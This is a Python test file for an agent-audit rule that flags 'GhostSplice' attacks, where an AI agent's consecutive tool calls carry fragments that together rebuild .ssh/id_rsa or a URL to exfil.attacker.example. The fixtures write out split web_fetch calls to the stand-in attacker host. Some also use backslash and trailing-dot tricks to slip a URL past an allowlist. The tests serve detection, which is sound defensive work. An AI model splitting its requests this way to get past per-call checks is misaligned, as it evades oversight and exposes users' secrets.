"""Tests for the session-scoped splice check (AAK-AGENT-COMPOSE-002).

Given an ordered transcript of tool calls, flag when the concatenation of arguments
across consecutive same-tool calls reconstructs a sensitive file path or a
non-allowlisted URL that no single call would have been allowed to request — the
GhostSplice shape. Narrow on purpose: file-path and URL reassembly only, WARN not fail.
"""

from __future__ import annotations

import json
import shutil
from pathlib import Path

from agent_audit_kit.rules.builtin import RULES
from agent_audit_kit.scanners.session_splice import scan

FIX = Path(__file__).resolve().parent / "fixtures" / "session_splice"
RULE = "AAK-AGENT-COMPOSE-002"


def _ids(root: Path) -> list[str]:
    return [f.rule_id for f in scan(root)[0]]


def test_rule_registered_warns_and_cites_ghostsplice() -> None:
    assert RULE in RULES
    rule = RULES[RULE]
    assert rule.severity.value == "medium", "defaults to warn, not fail"
    assert rule.category.value == "trust-boundary"
    # Cites the disclosure and is honest about provenance.
    assert "asset-group.github.io/disclosures/ghostsplice" in rule.description
    assert "not from a reproduction" in rule.description.lower()
    # Its own limits block names the false-positive class.
    assert "false positive" in rule.limitations.lower()
    assert "chunked" in rule.limitations.lower()
    assert "GHOSTSPLICE-2026-08" in rule.incident_references


def test_path_reassembly_fires() -> None:
    findings, _ = scan(FIX / "path")
    assert RULE in [f.rule_id for f in findings]
    finding = next(f for f in findings if f.rule_id == RULE)
    # id_rsa reconstructed across the fragments.
    assert "id_rsa" in finding.evidence
    # Each fragment is reported as a contributing call.
    frags = " ".join(r["message"] for r in finding.related_locations)
    assert ".ssh/" in frags and "id_" in frags and "rsa" in frags


def test_url_reassembly_fires_on_non_allowlisted_host() -> None:
    findings, _ = scan(FIX / "url")
    assert RULE in [f.rule_id for f in findings]
    assert "attacker.example" in next(f for f in findings if f.rule_id == RULE).evidence


def test_benign_chunks_do_not_fire() -> None:
    # A read split into src/ + main + .py reassembles to a normal path -> no finding.
    assert _ids(FIX / "benign") == []


def test_single_call_with_full_target_is_out_of_scope() -> None:
    # One call already reading .ssh/id_rsa is a per-call issue, not composition:
    # this SET-level rule must not fire (a per-call rule owns that case).
    assert _ids(FIX / "single") == []


def test_egress_allowlist_is_configurable(tmp_path: Path) -> None:
    shutil.copytree(FIX / "url", tmp_path / "proj")
    aak = tmp_path / "proj" / ".aak"
    aak.mkdir()
    (aak / "composition-boundaries.yaml").write_text(
        "egress_allowlist: [exfil-collector.attacker.example]\n"
        "session_reassembly:\n"
        "  sensitive_path_patterns: [id_rsa, .env]\n",
        encoding="utf-8",
    )
    # The reassembled host is now allowlisted -> the URL splice no longer fires.
    assert _ids(tmp_path / "proj") == []


def test_a_backslash_cannot_make_a_spliced_url_look_allowlisted(tmp_path: Path) -> None:
    """The reassembled URL is docs.example.com to `urlparse` and
    exfil.attacker.example to a fetch tool that parses as Node does, so an
    allowlisted docs.example.com let the splice through."""
    root = tmp_path / "proj"
    (root / ".aak").mkdir(parents=True)
    (root / ".aak" / "composition-boundaries.yaml").write_text(
        "egress_allowlist: [docs.example.com]\n", encoding="utf-8",
    )
    (root / "run.session.json").write_text(json.dumps({"calls": [
        {"tool": "web_fetch", "arguments": {"url": "https://exfil.attacker."}},
        {"tool": "web_fetch", "arguments": {"url": "example\\@docs.example.com/upload"}},
    ]}), encoding="utf-8")
    assert _ids(root) == [RULE]


def _splice(root: Path, *fragments: str, allowlist: str = "") -> list[str]:
    if allowlist:
        (root / ".aak").mkdir(parents=True)
        (root / ".aak" / "composition-boundaries.yaml").write_text(
            f"egress_allowlist: [{allowlist}]\n", encoding="utf-8",
        )
    root.mkdir(parents=True, exist_ok=True)
    (root / "run.session.json").write_text(json.dumps({"calls": [
        {"tool": "web_fetch", "arguments": {"url": fragment}} for fragment in fragments
    ]}), encoding="utf-8")
    return _ids(root)


def test_a_spliced_url_ending_in_a_root_dot_is_judged_by_its_host(tmp_path: Path) -> None:
    """`attacker.example.` is the fully qualified spelling of attacker.example,
    and a client connects to the same host. A reassembled URL whose host ended
    in a dot was skipped, so a splice could finish its host with one."""
    assert _splice(tmp_path / "a", "https://exfil.attacker", ".example./upload") == [RULE]
    assert _splice(tmp_path / "b", "https://exfil.attacker", ".example.") == [RULE]


def test_a_root_dot_does_not_take_a_host_off_the_allowlist(tmp_path: Path) -> None:
    root = tmp_path / "proj"
    assert _splice(root, "https://docs.", "example.com./guide", allowlist="docs.example.com") == []


def test_a_fragment_that_names_the_host_with_a_root_dot_is_no_splice(tmp_path: Path) -> None:
    """One call already asked for attacker.example: the second only adds a path."""
    assert _splice(tmp_path / "proj", "https://attacker.example.", "/upload") == []
